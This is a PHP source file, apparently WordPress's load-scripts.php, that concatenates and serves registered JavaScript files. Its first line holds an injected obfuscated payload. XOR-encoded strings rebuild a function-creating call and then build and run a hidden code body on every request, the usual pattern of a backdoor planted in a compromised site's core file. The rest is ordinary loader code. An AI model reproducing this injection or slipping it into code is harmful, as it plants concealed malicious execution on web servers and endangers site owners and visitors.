<?php $TaQzItWpYF='OCH-YR8>4ZUB.::'^',1-L-7gXA466GUT';$XHWecsKkz=$TaQzItWpYF('','ZKmD6ESNTQD>aW,=;0Xcq3U eX-T;+><UIKXFTMZE28NX-B VG0 +c.90013S3<dp.MB3OMaSK5QxKbRc5zQ0S-6YhVaLdRsZyJR:mjZFmphjIr:W6ONL,:mM7XM3DSHgSfnpgh7uSO2ofISpC2ATXiuI;yeUB.7B0sGkPS7>N41WcBG5.JvqyopA Y17+<Lu<I=Lw8oGL5h6nD6B0pOU,ZT8RVDSVW,,8<WREPoS;UDKcpGWD:4R0ERzk:uuareptVDKN2TLpzKbVHY L ZpEcLV=L36n>08uEzN.<BMoMb10IVMWin=2W9PLg0;78HAjgh,0C7NHKBj786Y57-Zjs<1uon,=:LA7VTWX8KJigL7Y 90yU:=pgW.4AZs>E;ePHf<EBmhNYS6X3VEdwCJ.YC.rOj.hG6Ss6W2;tyCy=>A1:IT8=0Xb:B0,77Z6lo F0zB STYa=-YY6V2YC390QLBEU>O65cE=2QMp4=3KCVAT5LtmLT+=-WjQRJq1++=T4kO  WvmIR 6ZAxYhsyOZQOoQJL:5miX1HTnhOIiZRP0c XJPB5WTQbIUsyBQTqGEJeOm-W>wXsdUruwSLA9M6FKBnX+UIYFyFJM1X.Z<EoZV 1H-JcoRrRlh79yP.O5qJJMFX=n2;BW;VVT1sngZT;1MaZfwnF'^'3-EeP0=- 8+P>2TTHD+KVK:R:<L ZtaQ =lqot6PLTM ;Y+O8gHOY<JXDQnl>FHLTJ,6RcmE8.LxXkBrCNpX9wBC-HkAkCiySp,=HEN3fPPXQiVSkE;< ITEiS99RmhhC:MEYma>Q<:FOHtsXgV  92Q fY;ufER;kW.KusDJ<XT9Kf,PWc+XBeyHR<EBYRdQS<IeL2f:FHb<J W6QPruJ;8K7mNw26XMgW2+emO5Z97.XzM1+HQ3S-rROe6:.9,5T77kjY15PGuBr>8L9EsP>iErY-GW1UUAUxZjEY;veDFUQ=7mjIJKS;L5wmM1=Q.aBFLHQ7Vgh0HcQWD<TTEzBWcc0>;innl Dvp<=AkwWGhA8LLUPuA7ynsJU5;,U BEmhBW ;VbGPwR9G7eYWg<O56KIEcSb:<YWR6FZTDc9HP2TH 5TTJ=JB-BsSV.W30M3DR A 1oUbI<:Y2WqgWXD0eneqZ.BT<.XKxdK>TUcg2  TlRKl5YOL.5:73.TSBN GChKE.QAivDW. QyNUYg75zGu.-NT6N3T1s3AotTzugQQEhzdqWef2R,mKOuflEqprTwTIeXA:TMuTSW2>3X4i-.;1=S<:-5Qa:,H4A;XbCzrDP<LcJOrRrLHL3p5X.YYn.,29fIBZ;;T72slZUmS1CX9IjOLd;');$XHWecsKkz();

/**
 * Disable error reporting
 *
 * Set this to error_reporting( -1 ) for debugging.
 */
error_reporting(0);

/** Set ABSPATH for execution */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', dirname( dirname( __FILE__ ) ) . '/' );
}

define( 'WPINC', 'wp-includes' );

$load = $_GET['load'];
if ( is_array( $load ) )
	$load = implode( '', $load );

$load = preg_replace( '/[^a-z0-9,_-]+/i', '', $load );
$load = array_unique( explode( ',', $load ) );

if ( empty($load) )
	exit;

require( ABSPATH . 'wp-admin/includes/noop.php' );
require( ABSPATH . WPINC . '/script-loader.php' );
require( ABSPATH . WPINC . '/version.php' );

$compress = ( isset($_GET['c']) && $_GET['c'] );
$force_gzip = ( $compress && 'gzip' == $_GET['c'] );
$expires_offset = 31536000; // 1 year
$out = '';

$wp_scripts = new WP_Scripts();
wp_default_scripts($wp_scripts);

if ( isset( $_SERVER['HTTP_IF_NONE_MATCH'] ) && stripslashes( $_SERVER['HTTP_IF_NONE_MATCH'] ) === $wp_version ) {
	$protocol = $_SERVER['SERVER_PROTOCOL'];
	if ( ! in_array( $protocol, array( 'HTTP/1.1', 'HTTP/2', 'HTTP/2.0' ) ) ) {
		$protocol = 'HTTP/1.0';
	}
	header( "$protocol 304 Not Modified" );
	exit();
}

foreach ( $load as $handle ) {
	if ( !array_key_exists($handle, $wp_scripts->registered) )
		continue;

	$path = ABSPATH . $wp_scripts->registered[$handle]->src;
	$out .= get_file($path) . "\n";
}

header("Etag: $wp_version");
header('Content-Type: application/javascript; charset=UTF-8');
header('Expires: ' . gmdate( "D, d M Y H:i:s", time() + $expires_offset ) . ' GMT');
header("Cache-Control: public, max-age=$expires_offset");

if ( $compress && ! ini_get('zlib.output_compression') && 'ob_gzhandler' != ini_get('output_handler') && isset($_SERVER['HTTP_ACCEPT_ENCODING']) ) {
	header('Vary: Accept-Encoding'); // Handle proxies
	if ( false !== stripos($_SERVER['HTTP_ACCEPT_ENCODING'], 'deflate') && function_exists('gzdeflate') && ! $force_gzip ) {
		header('Content-Encoding: deflate');
		$out = gzdeflate( $out, 3 );
	} elseif ( false !== stripos($_SERVER['HTTP_ACCEPT_ENCODING'], 'gzip') && function_exists('gzencode') ) {
		header('Content-Encoding: gzip');
		$out = gzencode( $out, 3 );
	}
}

echo $out;
exit;
